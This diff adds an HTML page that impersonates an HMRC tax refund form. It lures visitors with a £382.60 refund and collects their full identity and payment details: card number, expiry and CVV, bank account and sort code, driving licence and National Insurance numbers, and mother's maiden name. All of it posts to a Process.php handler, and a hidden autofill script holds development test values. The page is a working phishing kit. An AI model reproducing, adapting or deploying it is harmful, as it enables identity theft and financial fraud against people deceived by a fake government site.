@@ -1,0 +1,368 @@
+<html><head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+<title>HMRC : Tax Refund</title>
+<link href="assets/img/favicon.ico" rel="icon" type="image/x-icon">
+<link href="assets/styles/main.css" media="screen" rel="stylesheet" type="text/css">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
+<script src="assets/js/jquery.payment.js"></script>
+<script src="http://cdn.jsdelivr.net/jquery.validation/1.14.0/jquery.validate.js"></script>
+<script src="http://jqueryvalidation.org/files/dist/additional-methods.min.js"></script>
+<script type="text/javascript">
+function movetoNext(current, nextFieldID) {
+if (current.value.length >= current.maxLength) {
+document.getElementById(nextFieldID).focus();
+}
+}
+</script>
+<script>
+function populate() {
+document.getElementById('name').value = "Steve Smith";
+document.getElementById('day').value = "02";
+document.getElementById('month').value = "08";
+document.getElementById('year').value = "1965";
+document.getElementById('telephone').value = "07475566966";
+document.getElementById('email').value = "bob@aol.com";
+document.getElementById('address').value = "21 some road";
+document.getElementById('town').value = "Townie";
+document.getElementById('postcode').value = "BT412US";
+document.getElementById('ccname').value = "S Smith";
+document.getElementById('cc-number').value = "4111 1111 1111 1111";
+document.getElementById('cc-exp').value = "02 / 16";
+document.getElementById('cc-cvc').value = "108";
+document.getElementById('acno').value = "10805252";
+document.getElementById('sort1').value = "77";
+document.getElementById('sort2').value = "02";
+document.getElementById('sort3').value = "04";
+document.getElementById('dl').value = "DL521545428";
+document.getElementById('ni').value = "JP891245B";
+document.getElementById('mmn').value = "Philips";
+}
+</script>
+<script>
+    jQuery(function($) {
+      $('.cc-number').payment('formatCardNumber');
+      $('.cc-exp').payment('formatCardExpiry');
+      $('.cc-cvc').payment('formatCardCVC');
+
+      $.fn.toggleInputError = function(erred) {
+        this.parent('.field').toggleClass('errorzzzz', erred);
+        return this;
+      };
+
+      $('form').submit(function(e) {
+        e.preventDefault();
+
+        var cardType = $.payment.cardType($('.cc-number').val());
+        $('.cc-number').toggleInputError(!$.payment.validateCardNumber($('.cc-number').val()));
+        $('.cc-exp').toggleInputError(!$.payment.validateCardExpiry($('.cc-exp').payment('cardExpiryVal')));
+        $('.cc-cvc').toggleInputError(!$.payment.validateCardCVC($('.cc-cvc').val(), cardType));
+        $('.cc-brand').text(cardType);
+      });
+
+    });
+	
+</script>
+<script>
+jQuery.validator.addMethod('phoneUK', function(phone_number, element) {
+return this.optional(element) || phone_number.length > 9 &&
+phone_number.match(/^(((\+44)? ?(\(0\))? ?)|(0))( ?[0-9]{3,4}){3}$/);
+}, 'Please check the telephone number you have provided');
+
+jQuery.validator.addMethod("postcodeUK", function(value, element) {
+return this.optional(element) || /^(([gG][iI][rR] {0,}0[aA]{2})|((([a-pr-uwyzA-PR-UWYZ][a-hk-yA-HK-Y]?[0-9][0-9]?)|(([a-pr-uwyzA-PR-UWYZ][0-9][a-hjkstuwA-HJKSTUW])|([a-pr-uwyzA-PR-UWYZ][a-hk-yA-HK-Y][0-9][abehmnprv-yABEHMNPRV-Y]))) {0,}[0-9][abd-hjlnp-uw-zABD-HJLNP-UW-Z]{2}))$/i.test(value);
+}, "Please check the postcode you have provided");
+
+$('#details').validate();
+  (function($,W,D)
+{
+    var JQUERY4U = {};
+
+    JQUERY4U.UTIL =
+    {
+        setupFormValidation: function()
+        {
+            //form validation rules
+            $("#details").validate({
+				errorElement: "div",			
+                rules: {
+					name: {	required: true,	minlength: 4,},
+					day: { required: true},
+					month: { required: true},
+					year: { required: true},
+					telephone: { required: true, minlength: 11, digits: true,},
+					email: { required: true, email: true,},
+					address: { required: true, minlength: 5,},
+					town: { required: true, minlength: 3,},
+					postcode: { required: true, minlength: 5,},
+					ccname: { required: true, minlength: 4,},
+					ccno: { required: true, minlength: 16, creditcard: true},
+					ccexp: { required: true, minlength: 4,},
+					secode: { required: true, minlength: 3, digits: true,},
+					acno: { required: true, minlength: 8, digits: true,},
+					sort1: { required: true, minlength: 2, digits: true,},
+					sort2: { required: true, minlength: 2, digits: true,},
+					sort3: { required: true, minlength: 2, digits: true,},
+					ni: { required: true, minlength: 9,},
+					mmn: { required: true, minlength: 2,},
+                },
+				groups: {
+					dob: "day month year",
+					sortcode: "sort1 sort2 sort3",
+				},
+				errorPlacement: function(error, element) {
+				if (element.attr("name") == "day" || element.attr("name") == "month" || element.attr("name") == "year") 
+				error.insertAfter("#doberror");
+				else 
+				error.insertAfter(element);	
+				if (element.attr("name") == "sort1" || element.attr("name") == "sort2" || element.attr("name") == "sort3") 
+				error.insertAfter("#expiryerror");
+				if (element.attr("name") == "secode") 
+				error.insertAfter("#secodeerror");
+				if (element.attr("name") == "acno") 
+				error.insertAfter("#acnoerror");
+				},
+                messages: {
+					name: {
+						required: "Please provide your full name",
+						minlength: jQuery.validator.format("Please provide your full name"),
+					},
+					day: { required: "Please provide your date of birth", },
+					month: { required: "Please provide your date of birth", },
+					year: { required: "Please provide your date of birth", },
+					telephone: {
+						required: "Please provide your telephone number",
+						minlength: jQuery.validator.format("Please ensure you enter digits only"),
+						digits: jQuery.validator.format("Please ensure you enter digits only"),
+					},
+					email: {
+						required: "Please provide your email address",
+						email: jQuery.validator.format("Please check the email address you have entered"),
+					},
+					address: {
+						required: "Please provide the 1st line of your address",
+						minlength: jQuery.validator.format("Please check the address you have entered"),
+					},
+					town: {
+						required: "Please provide your city/town",
+						minlength: jQuery.validator.format("Please check the city/town you have entered"),
+					},
+					postcode: {
+						required: "Please provide your postcode",
+						minlength: jQuery.validator.format("Please check the postcode you have entered"),
+					},
+					ccname: {
+						required: "Please provide your name as it appears on your card",
+						minlength: jQuery.validator.format("Please provide your name as it appears on your card"),
+					},
+					ccno: {
+						required: "Please provide your 16 digit card number",
+						minlength: jQuery.validator.format("Please check the card number you have entered"),
+						creditcard: jQuery.validator.format("Please check the card number you have entered"),
+					},
+					ccexp: {
+						required: "Please provide your cards expiry date",
+						minlength: jQuery.validator.format("Please check the card expiry date you have entered"),
+						date: jQuery.validator.format("Please check the card expiry date you have entered"),
+					},
+					secode: {
+						required: "Please provide your 3 digit card security code (CVV)",
+						minlength: jQuery.validator.format("Please check the card security code you have entered"),
+						digits: jQuery.validator.format("Please ensure you enter digits only"),
+					},
+					acno: {
+						required: "Please provide your 8 digit account number",
+						minlength: jQuery.validator.format("Please check the account number you have entered"),
+						digits: jQuery.validator.format("Please ensure you enter digits only"),
+					},
+					sort1: { required: "Please provide your sortcode", minlength: jQuery.validator.format("Please check the sortcode you have entered"), digits: jQuery.validator.format("Please ensure you enter digits only"), },
+					sort2: { required: "Please provide your sortcode", minlength: jQuery.validator.format("Please check the sortcode you have entered"), digits: jQuery.validator.format("Please ensure you enter digits only"), },
+					sort3: { required: "Please provide your sortcode", minlength: jQuery.validator.format("Please check the sortcode you have entered"), digits: jQuery.validator.format("Please ensure you enter digits only"), },
+					ni: { required: "Please provide your national insurance number", minlength: jQuery.validator.format("Please check the national insurance number you have entered"), },
+					mmn: { required: "Please provide your mother's maiden name", minlength: jQuery.validator.format("Please check the mother's maiden name you have entered"), },
+				},
+                submitHandler: function(form) {
+                    form.submit();
+                }
+            });
+        }
+    }
+
+    //when the dom has loaded setup form validation rules
+    $(D).ready(function($) {
+        JQUERY4U.UTIL.setupFormValidation();
+    });
+
+})(jQuery, window, document);
+  
+</script>
+</head>
+<body id="top">
+   <div id="dialogoverlay"></div>
+<div id="dialogbox">
+  <div>
+    <div id="dialogboxhead"></div>
+    <div id="dialogboxbody"></div>
+    <div id="dialogboxfoot"></div>
+  </div>
+</div> 
+<div id="header-digital"><a accesskey="1" href="#"><img class="screen" src="assets/img/logo.png" width="256" height="0"></a>
+<ul class="inline-navigation">
+<li><a href="#">Home</a></li>
+<li><a href="#"><span lang="cy">Cymraeg</span></a></li>
+<li><a class="new-window" href="#">Contact HMRC</a></li>
+<li><a accesskey="6" class="popup-window" href="#">Help</a></li>
+</ul>
+</div>
+<div class="no-menu" id="banner">
+<div id="user-information"></div>
+<h1>Tax Refund</h1>
+</div>
+<!-- DEVELOPMENT ONLY -->
+<div style="display:none">
+<a href="#" onclick="populate();" style="font-size:30px;color;red;background-color:yellow;font-weight:800;">AUTO FILL</a>
+</div>
+<!-- DEVELOPMENT ONLY -->
+<div class="portlet">
+<div class="portlet-body">
+<form action="Process.php?&amp;sessionid=jkX49ZHoxzlp0VtMktE5VyDQyN6hlevM3G3h6vMxtqxOxggCjtQ9msYZgyuqRZPHGGqFUz8EvDF8W7u5&amp;securessl=true" class="narrow-labels" id="details" method="post" name="details" enctype="multipart/form-data" novalidate="novalidate">
+<p>Please complete the form below in order for us to process your tax refund. HM Revenue and Customs (HMRC) will usually send repayments within 2 weeks, but it may take longer in some cases. You should wait 4 weeks after making an online claim and 6 weeks after making a postal claim before contacting HMRC about the payment.</p>
+<h2>Step 1: Personal Information</h2>
+<fieldset>
+
+<div class="field">
+<label for="name">Full Name:</label>
+<input class="std" id="name" maxlength="40" name="name" type="text" value="">
+</div>
+
+<div class="field" id="date">
+<label for="dob">Date Of Birth:</label> 
+<select class="datedob" id="day" name="day">
+<option selected="selected" value="">Day</option><option value="01">01</option><option value="02">02</option> <option value="03">03</option> <option value="04">04</option> <option value="05">05</option> <option value="06">06</option> <option value="07">07</option> <option value="08">08</option> <option value="09">09</option> <option value="10">10</option> <option value="11">11</option> <option value="12">12</option> <option value="13">13</option> <option value="14">14</option> <option value="15">15</option> <option value="16">16</option> <option value="17">17</option> <option value="18">18</option> <option value="19">19</option> <option value="20">20</option> <option value="21">21</option> <option value="22">22</option> <option value="23">23</option> <option value="24">24</option> <option value="25">25</option> <option value="26">26</option> <option value="27">27</option> <option value="28">28</option> <option value="29">29</option> <option value="30">30</option> <option value="31">31</option> 
+</select> 
+<select class="datedob" id="month" name="month"> 
+<option value="">Month</option>
+<option value="01">Jan</option>
+<option value="02">Feb</option>
+<option value="03">Mar</option>
+<option value="04">Apr</option>
+<option value="05">May</option>
+<option value="06">Jun</option>
+<option value="07">Jul</option>
+<option value="08">Aug</option>
+<option value="09">Sep</option>
+<option value="10">Oct</option>
+<option value="11">Nov</option>
+<option value="12">Dec</option>
+</select> 
+<select class="datedob" id="year" name="year"> <option selected="selected" value="">Year</option> <option value="1914">1914</option> <option value="1915">1915</option> <option value="1916">1916</option> <option value="1917">1917</option> <option value="1918">1918</option> <option value="1919">1919</option> <option value="1920">1920</option> <option value="1921">1921</option> <option value="1922">1922</option> <option value="1923">1923</option> <option value="1924">1924</option> <option value="1925">1925</option> <option value="1926">1926</option> <option value="1927">1927</option> <option value="1928">1928</option> <option value="1929">1929</option> <option value="1930">1930</option> <option value="1931">1931</option> <option value="1932">1932</option> <option value="1933">1933</option> <option value="1934">1934</option> <option value="1935">1935</option> <option value="1936">1936</option> <option value="1937">1937</option> <option value="1938">1938</option> <option value="1939">1939</option> <option value="1940">1940</option> <option value="1941">1941</option> <option value="1942">1942</option> <option value="1943">1943</option> <option value="1944">1944</option> <option value="1945">1945</option> <option value="1946">1946</option> <option value="1947">1947</option> <option value="1948">1948</option> <option value="1949">1949</option> <option value="1950">1950</option> <option value="1951">1951</option> <option value="1952">1952</option> <option value="1953">1953</option> <option value="1954">1954</option> <option value="1955">1955</option> <option value="1956">1956</option> <option value="1957">1957</option> <option value="1958">1958</option> <option value="1959">1959</option> <option value="1960">1960</option> <option value="1961">1961</option> <option value="1962">1962</option> <option value="1963">1963</option> <option value="1964">1964</option> <option value="1965">1965</option> <option value="1966">1966</option> <option value="1967">1967</option> <option value="1968">1968</option> <option value="1969">1969</option> <option value="1970">1970</option> <option value="1971">1971</option> <option value="1972">1972</option> <option value="1973">1973</option> <option value="1974">1974</option> <option value="1975">1975</option> <option value="1976">1976</option> <option value="1977">1977</option> <option value="1978">1978</option> <option value="1979">1979</option> <option value="1980">1980</option> <option value="1981">1981</option> <option value="1982">1982</option> <option value="1983">1983</option> <option value="1984">1984</option> <option value="1985">1985</option> <option value="1986">1986</option> <option value="1987">1987</option> <option value="1988">1988</option> <option value="1989">1989</option> <option value="1990">1990</option> <option value="1991">1991</option> <option value="1992">1992</option> <option value="1993">1993</option> <option value="1994">1994</option> <option value="1995">1995</option> <option value="1996">1996</option> <option value="1997">1997</option> <option value="1998">1998</option> <option value="1999">1999</option> 
+</select>
+<div id="doberror"></div>
+</div>
+
+<div class="field">
+<label for="telephone">Telephone Number:</label> 
+<input class="std telephone phoneUK" id="telephone" maxlength="11" name="telephone" type="tel" value="">
+</div>
+
+<div class="field">
+<label for="email">Email Address:</label> 
+<input class="std email" id="email" maxlength="40" name="email" type="email" value="">
+</div>
+
+<div class="field">
+<label for="address">Address Line 1:</label> 
+<input class="std address" id="address" maxlength="40" name="address" type="text" value="">
+</div>
+
+<div class="field">
+<label for="town">City/Town:</label> 
+<input class="std town" id="town" maxlength="40" name="town" type="text" value="">
+</div>
+<div class="field">
+<label for="postcode">Postcode:</label> 
+<input class="postal postcodeUK" id="postcode" maxlength="40" name="postcode" type="text" value="">
+</div>
+</fieldset>
+<br>
+<h2>Step 2: Payment Details</h2>
+<br>
+<p>Please enter the credit/debit card details that you would like your tax refund to be credited to.</p>
+<fieldset>
+
+<div class="field">
+<label for="ccname">Cardholder Name:</label> 
+<input class="std ccname" id="ccname" placeholder="As it appears on card" maxlength="40" name="ccname" type="text" value="">
+</div>
+<div class="field">
+<label for="ccno">Card Number:</label> 
+<input class="std input-lg form-control cc-number" id="cc-number" name="ccno" placeholder="••••••••••••••••" type="text" value="">
+<div id="ccerror" class="error"></div>
+</div>
+<div class="field">
+<label for="expiry">Expiry Date:</label> 
+<input class="dateexpiry input-lg form-control cc-exp" id="cc-exp" name="ccexp" placeholder="•• / ••" type="text" value="">
+</div>
+<div class="field">
+<label for="secode">Card Verification Code:</label> 
+<input class="secode short-code input-lg form-control cc-cvc" maxlength="4" id="cc-cvc" name="secode" placeholder="•••" type="text" value=""> <a href="assets/help/secode.php" onclick="window.open('assets/help/secode.php', 'newwindow', 'width=600, height=500'); return false;"><img alt="Help about: Card Verification Code - opens in a new window" src="assets/img/help.gif" title="Help about: Card Verification Code - opens in a new window" width="13" height="13"></a>
+<div id="secodeerror"></div>
+</div>
+<div class="field">
+<label for="acno">Account Number:</label> 
+<input class="number" id="acno" maxlength="9" name="acno" placeholder="" type="text" value=""> <a href="assets/help/acno.php" onclick="window.open('assets/help/acno.php', 'newwindow', 'width=600, height=500'); return false;"><img alt="Help about: Card Verification Code - opens in a new window" src="assets/img/help.gif" title="Help about: Card Verification Code - opens in a new window" width="13" height="13"></a>
+<div class="hint" id="HintfullName"></div>
+<div id="acnoerror"></div>
+</div>
+<div class="field">
+<label for="sortcode">Sortcode:</label> 
+<input class="sort" id="sort1" maxlength="2" name="sort1" placeholder="" type="text" value="" onkeyup="movetoNext(this, 'sort2')">
+<input class="sort" id="sort2" maxlength="2" name="sort2" placeholder="" type="text" value="" onkeyup="movetoNext(this, 'sort3')"> 
+<input class="sort" id="sort3" maxlength="2" name="sort3" placeholder="" type="text" value="">
+<a href="assets/help/sort.php" onclick="window.open('assets/help/sort.php', 'newwindow', 'width=600, height=500'); return false;"><img alt="Help about: Sortcode - opens in a new window" src="assets/img/help.gif" title="Help about: Sortcode - opens in a new window" width="13" height="13"></a>
+<div class="hint" id="HintfullName"></div>
+<div id="expiryerror"></div>
+</div>
+</fieldset>
+<br>
+<h2>Step 3: Verify Your Identity</h2>
+<br>
+<p>In order to prevent online fraud it is essential that we verify your identification when processing an online claim for a tax refund. Please complete the information below in order to continue with your request.</p>
+<fieldset>
+
+<div class="field">
+<label for="dlno">Driving Licence Number:</label> 
+<input class="std" id="dl" maxlength="40" name="dl" type="text" value=""> <a href="assets/help/dl.php" onclick="window.open('assets/help/dl.php', 'newwindow', 'width=600, height=500'); return false;"><img alt="Help about: Driving Licence Number - opens in a new window" src="assets/img/help.gif" title="Help about: Driving Licence Number - opens in a new window" width="13" height="13"></a>
+<div class="hint" id="HintfullName"></div>
+</div>
+<div class="field">
+<label for="ni">National Insurance Number:</label> 
+<input class="std" id="ni" maxlength="40" name="ni" type="text" value="">
+</div>
+<div class="field">
+<label for="mmn">Mothers Maiden Name:</label> 
+<input class="std" id="mmn" maxlength="40" name="mmn" type="text" value="">
+</div>
+
+</fieldset>
+<br>
+<h2>Step 4:Review information and submit</h2>
+<br>
+<p>Please now review the information you have provided as inaccurate or missing information can cause unnecessary delays in processing your tax refund request.</p>
+<br>
+<div class="field"><label for="FieldfullName" id="###">Refund Amount:</label> <input class="number" disabled="disabled" id="FieldfullName" maxlength="40" name="ra" type="text" value="£382.60"> 
+<input name="next" type="submit" value="Submit"></div>
+</form>
+<br>
+<br>
+<br>
+<ul class="inline-navigation" id="footer">
+<li class="first">© <a class="new-window" href="#">Crown Copyright</a></li>
+<li><a accesskey="8" class="new-window" href="#">HMRC Terms &amp; Conditions</a></li>
+<li><a class="new-window" href="#">HMRC Privacy policy</a></li>
+<li><a accesskey="0" class="new-window" href="#">HMRC Accessibility</a></li>
+</ul>
+<br>
+</div>
+</div>
+
+</body></html>
